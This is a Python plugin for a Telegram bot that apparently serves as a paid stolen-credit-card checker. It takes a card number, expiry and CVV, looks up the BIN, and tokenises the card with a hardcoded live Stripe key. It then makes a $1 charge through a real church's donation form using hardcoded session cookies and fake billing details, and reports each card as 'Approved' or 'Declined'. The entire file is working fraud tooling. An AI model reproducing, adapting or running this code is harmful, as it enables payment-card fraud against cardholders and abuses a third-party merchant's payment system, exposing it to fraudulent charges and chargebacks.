from configss._def_main_ import *


@Client.on_message(filters.command(["fr"], ["/", "."]))
async def sv(_, message: Message):
    
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>𝙐𝙨𝙚 <code>/fr card</code></b>")
                return

            ccs  = data[1]
            card = re.split(r'[;!?-_+#•÷×°^~/|:]', ccs)
            tiempoinicio = time.perf_counter()
            rank = get_user_rank(message.from_user.id)
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>𝙐𝙨𝙚 <code>/fr card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            
            tiempofinal = time.perf_counter()
            msg=await message.reply(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■□□□□□□□ 20% 🟣 1.0(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

            h={
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}
            d=f'time_on_page=85941&guid=82ab7260-fe8b-42ae-b243-6c3bb9ae6f6aeb0168&muid=106d5750-e072-4940-8c47-fe8ce017bef8f3099d&sid=02f9aef9-82ca-41de-a39e-86f420a1d6f2d174d8&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F78ef418&card[name]=BSLINUX+BS&card[number]='+cc+'&card[exp_month]='+mes+'&card[exp_year]='+ano+'&card[cvc]='+cvv
            response1 = requests.post(
    'https://api.stripe.com/v1/tokens',
    headers=h,
    data=d,
)
            json_first = json.loads(response1.text)
            if 'error' in json_first:
                text = f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            elif 'id' not in json_first:
                text = f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code> 
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━"""
                await msg.edit_text(text)
            else:
                idw = json_first["id"]

                msg1=await msg.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■□□□□ 49% 🔴 4.40(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")


                cookies = {
    '__stripe_mid': '106d5750-e072-4940-8c47-fe8ce017bef8f3099d',
    'pdb-sess': '4d325544c68b434a992960b36a15f7c5',
    '__stripe_sid': 'd826b14e-cf8f-4597-9439-5a0d9780fefc9cf0d7',
}
                headers = {
    'authority': 'www.churchofgodpacoima.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__stripe_mid=106d5750-e072-4940-8c47-fe8ce017bef8f3099d; pdb-sess=4d325544c68b434a992960b36a15f7c5; __stripe_sid=d826b14e-cf8f-4597-9439-5a0d9780fefc9cf0d7',
    'origin': 'https://www.churchofgodpacoima.com',
    'referer': 'https://www.churchofgodpacoima.com/donate/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

                data = {
    'action': 'wp_full_stripe_payment_charge',
    'formName': 'Donation',
    'fullstripe_name': 'BSLINUX BS',
    'fullstripe_email': 'bslinux079@gmail.com',
    'fullstripe_custom_input': 'BS',
    'fullstripe_custom_amount': '1',
    'fullstripe_address_line1': 'sbsbs',
    'fullstripe_address_line2': 'dd',
    'fullstripe_address_city': 'NEW YORK',
    'fullstripe_address_state': 'New York',
    'fullstripe_address_zip': '10080',
    'stripeToken': idw,
}
                response2 = requests.post('https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
                
                
                
                msg2=await msg1.edit(f"""<b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■■■■■□ 95% 🟢 6.20(s)
┣ • 𝘽𝙄𝙉 : <code>{BIN}</code>
┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank}
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code>  [{rank}]</b>""")

                
                if 'Your card was declined.' in response2.text:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card was declined</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")
                    
                elif"Your card's security code is incorrect." in response2.text:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card's security code is incorrect✅</code>
┣ •𝙂𝙖𝙩𝙚 =<code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")
                elif 'Your card has insufficient funds.' in response2.text:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card has insufficient funds [✅]</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")

                elif 'Your card number is incorrect.' in response2.text:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗗𝗘𝗖𝗟𝗜𝗡𝗘❌</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your card number is incorrect [❌️]</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")

                elif 'succeed' in response2.text:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged</code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")

                else:
                    await msg2.edit(f"""<b>
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗖𝗖 = <code>{cc}|{mes}|{ano}|{cvv}</code>
┣ •𝗦𝘁𝗮𝘁𝘂𝘀 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱✅</code>
┣ •𝙂𝙖𝙩𝙚 = <code>stripe Charged </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{BIN}</code>
┣ •𝗕𝗮𝗻𝗸: <code>{bank}</code>
┣ •𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_name} [{country_flag}] </code>
┗━━━━━━━━━━━━━━━━━━━━
┏━━━━━━━━━━━━━━━━━━━━
┣ •𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>
┣ •𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>
┣ • 𝘽𝙤𝙩 𝙗𝙮:@Barry_op
┗━━━━━━━━━━━━━━━━━━━━""")
        
      
        else:
            return await message.reply(f'<b>𝘾𝙝𝙖𝙩 𝙣𝙤 𝙖𝙪𝙩𝙤𝙧𝙞𝙯𝙖𝙙𝙤 𝙊 𝙉𝙤 𝙀𝙧𝙚𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙚 𝘾𝙤𝙣 𝙡𝙤𝙨 𝙎𝙚𝙡𝙡𝙚𝙧 𝙤 𝙊𝙬𝙣𝙚𝙧</b>',reply_markup=InlineKeyboardMarkup(

        [

            [



                InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍1", url="t.me/Barry_op"),

InlineKeyboardButton("𝙊𝙒𝙉𝙀𝙍2", url="t.me/Barry_op"),
                
            ]
            
        ]

    )
    
 )        